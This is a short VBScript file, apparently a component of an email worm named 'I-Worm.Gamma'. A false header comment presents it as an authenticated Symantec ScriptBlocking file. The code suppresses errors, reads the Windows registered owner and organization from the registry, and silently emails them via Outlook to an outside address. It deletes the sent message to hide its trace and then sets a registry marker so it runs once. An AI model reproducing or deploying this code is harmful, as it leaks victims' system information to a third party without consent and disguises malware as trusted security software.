' Symantec ScriptBlocking Authenticated File
' A3C7B6E0-5535-11D5-911D-444553546170

On Error Resume Next
set f=CreateObject("Scripting.FileSystemObject")
set w=CreateObject("WScript.Shell")
If w.RegRead("HKLM\Software\Gamma\") <> "OK" Then
set o=CreateObject("Outlook.Application")
set m=o.CreateItem(0)
n=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
p=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")
m.To = "gammaworm@multimania.com"
m.Subject = "Message from " & n
s = "Time : " & time
s = s & vbCrLf & "Date : " & date
s = s & vbCrLf & "Organization : " & p
s = s & vbCrLf & vbCrLf & "		I-Worm.Gamma"
m.Body = s
m.DeleteAfterSubmit=True
m.Send
w.RegWrite "HKLM\Software\Gamma\", "OK"
End If
